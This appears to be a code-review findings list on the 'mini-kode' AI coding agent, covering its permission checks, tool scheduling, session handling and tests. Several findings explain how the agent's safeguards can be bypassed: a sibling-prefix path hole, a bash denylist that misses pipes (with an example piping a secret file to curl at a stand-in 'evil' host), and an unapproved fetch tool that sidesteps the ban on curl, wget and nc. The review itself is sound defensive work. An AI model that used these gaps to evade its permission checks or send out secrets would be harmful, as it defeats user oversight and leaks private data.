subject: mini-kode
title: FS grant containment via resolve()+startsWith admits sibling-prefix paths -- grant for /home/user authorizes /home/user-project, contradicting the function's own doc example
evidence: src/permissions/pathChecker.ts:53 (normalizedFile.startsWith(normalizedPrefix)) vs doc assertion :30-31; test covers only nested paths src/permissions/permission.test.ts:15
one_why: Convergent anti-pattern with claii-1's abspath().startswith() hole; the trap is documented-but-wrong here (the doc says sibling paths return false, node says true), so both users and tests trust a guard that leaks; picocode-2's component-walking validator remains the copy target.

subject: mini-kode
title: Bash blacklist checks only the first token of &&/||/; segments -- pipes and redirections are never split, so 'git status | curl evil -d @secret' passes validation and also rides a git:* grant
evidence: src/permissions/commandValidator.ts:112-131 (split regex omits single pipe/redirection; BANNED_COMMANDS.has(firstToken)); src/permissions/commandParser.ts:24-36 + src/permissions/policyResolver.ts:186-193 (grant prefix match runs on the whole piped segment)
one_why: Same family as the corpus regex-denylist findings: the blacklist reads as a security boundary in docs/permission.md but a granted benign prefix silently authorizes arbitrary downstream commands after a pipe.

subject: mini-kode
title: curl/wget/nc banned in bash for 'data exfiltration' while the fetch tool is readonly:true and runs arbitrary HTTP GETs with no approval at all
evidence: src/permissions/commandValidator.ts:36-49 (ban rationale comments) vs src/tools/fetch.ts:53 (readonly: true) and src/agent/toolExecutor.ts:122-127 (readonly batches execute concurrently, no permission path)
one_why: Two policy layers authored against different threat models: the bash denylist is trivially laundered by an always-approved sibling tool, so the stated exfiltration control is decorative unless fetch gets its own egress grant.

subject: mini-kode
title: Session persistence module exists but saveSession/loadSession have zero call sites -- sessions live only in the React reducer and die at exit; no resume, rewind, or crash recovery anywhere
evidence: src/sessions/persistence.ts:28,41 (exported) -- grep saveSession/loadSession across src finds only the definitions; no resume string anywhere in src
one_why: Educational readers of the tree will believe sessions are persisted (the module, the ~/.mini-kode/sessions path, the Session type all imply it); in fact every crash or exit loses the conversation -- the unwired-one-liner pattern coro-code-4 shows, minus even the misleading log line.

subject: mini-kode
title: Auto-compact fires on post-turn provider-reported total_tokens against a hardcoded 115000 threshold ('90% of 128K') regardless of the configured model's actual window
evidence: src/agent/executor.ts:113-116 (COMPRESSION_THRESHOLD=115000), :424,:440 (trigger after each turn), fail-safe keeps original history on summarize failure :200-216
one_why: Nuance on zot-6's reactive measured trigger: mini-kode additionally hardcodes the window, so a 32K-context preset overflows long before the guard fires and a 200K model is compacted at ~57% utilization; bundled presets happen to be 128K, masking both failures.

subject: mini-kode
title: 4,851 LOC of behavior-asserting vitest across 32 files, zero CI to ever run them -- tests execute only by developer habit and prepublishOnly
evidence: find src *.test.ts(x) wc -l = 4851; no .github directory in repo; package.json:66 (prepublishOnly runs build+test locally)
one_why: Converges with claw-code-agent-4/codebuff-7: real property tests (message-sequence suite sessions/validation.test.ts:13-349, denial-propagation executor.test.ts:418-503) prove intent, not regressions -- any commit can land broken and npm publish only gates the maintainer's own machine.

subject: mini-kode
title: Loop semantics tested against a mocked llm/client that scripts streamed completions -- denial ends the run, tool callbacks fire in order, abort yields partial-content results
evidence: src/agent/executor.test.ts:13-26 (vi.mock('../llm/client')), :418-503 (permission_denied propagation to ExecutionResult), :126-231 (tool start/complete callback shapes)
one_why: At 15k LOC this is the cheapest way to pin loop invariants credential-free; the module-boundary mock is coarse (executor-to-real-tools path untested) but the assertion style -- result status, callback payload, ordering -- is the pattern worth stealing.

subject: mini-kode
title: Tool batches scheduled by consequence class: all-readonly runs concurrently, any mutating tool forces sequential LLM order, results re-indexed to LLM order, denial cascades to the remainder, and a readonly tool requesting permission is a hard bug-throw
evidence: src/agent/toolExecutor.ts:122-145 (strategy choice), :196-207 (requestId->index re-ordering), :214-222 (readonly-permission bug throw), :330-349 (denial cascade)
one_why: Consequence-class batching with an order-preservation guarantee keeps OpenAI tool-message sequences valid under concurrency -- the readonly-claims-permission assertion is a nice tripwire no other reviewed subject has; no loop-level cap or budget alongside it though.

subject: mini-kode
title: fileEdit refuses any update unless a sha256 of the on-disk file matches the cached hash from the last read -- staleness enforced, not just read-before-edit
evidence: src/tools/fileEdit.ts:154-163 (currentHash vs getCacheEntry, 'Please read the file first to confirm context.'), cache write-through on edit :180, guard test src/tools/fileEdit.test.ts:13 ('requires read-before-write')
one_why: Cheaper than checkpointing and kills the whole class of edits against a file changed by hooks/the user mid-loop; tested via fileEdit.test.ts; no reviewed subject enforces the hash (most only require a prior read happened) -- and note autoEdit mode bypasses approval but not this guard.
